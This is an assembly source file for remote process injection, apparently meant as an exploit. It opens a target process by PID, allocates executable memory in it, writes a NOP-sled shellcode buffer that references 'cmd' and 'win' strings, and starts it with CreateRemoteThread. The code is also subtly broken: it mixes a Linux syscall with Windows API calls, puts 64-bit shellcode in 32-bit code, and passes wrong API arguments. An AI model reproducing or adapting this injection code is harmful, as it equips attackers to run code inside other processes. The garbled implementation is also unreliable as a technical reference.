section .data
    exploit_success db '[+] GRANTED!', 0xA
    msg_len equ $ - exploit_success
    buffer db 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
    db 0x48, 0x31, 0xC9
    db 0x48, 0x83, 0xE4, 0xF0
    db 0x50
    db 0x48, 0x89, 0xE2
    db 0x68, 0x2F, 0x63, 0x6D, 0x64
    db 0x68, 0x2F, 0x77, 0x69, 0x6E
    db 0x89, 0xE3
    db 0x50
    db 0x53
    db 0x51
    db 0x52
    db 0x54
    db 0xB8, 0xC7, 0x93, 0x1F, 0x00
    db 0xFF, 0xD0
    db 0xC3

section .bss
    pid resd 1
    hProcess resd 1
    hThread resd 1
    pRemoteMemory resd 1
    bytesWritten resd 1

section .text
    global _start

extern OpenProcess
extern VirtualAllocEx
extern WriteProcessMemory
extern CreateRemoteThread
extern ExitProcess

_start:
    mov eax, 0x03
    mov ebx, 0
    mov ecx, pid
    mov edx, 4
    int 0x80

    push dword [pid]
    push 0x001F0FFF
    call OpenProcess
    add esp, 8
    mov [hProcess], eax

    push 0x1000
    push 0
    push 0x40
    push 0x04
    push [hProcess]
    call VirtualAllocEx
    add esp, 20
    mov [pRemoteMemory], eax

    mov eax, [buffer]
    cmp eax, 0
    jne _write_buffer
    jmp _exit

_write_buffer:
    push 0x1000
    push [pRemoteMemory]
    push buffer
    push [hProcess]
    call WriteProcessMemory
    add esp, 16

    push 0
    push [pRemoteMemory]
    push [hProcess]
    call CreateRemoteThread
    add esp, 12
    mov [hThread], eax

    push 0
    push [hThread]
    call ExitProcess

_exit:
    push 0
    call ExitProcess
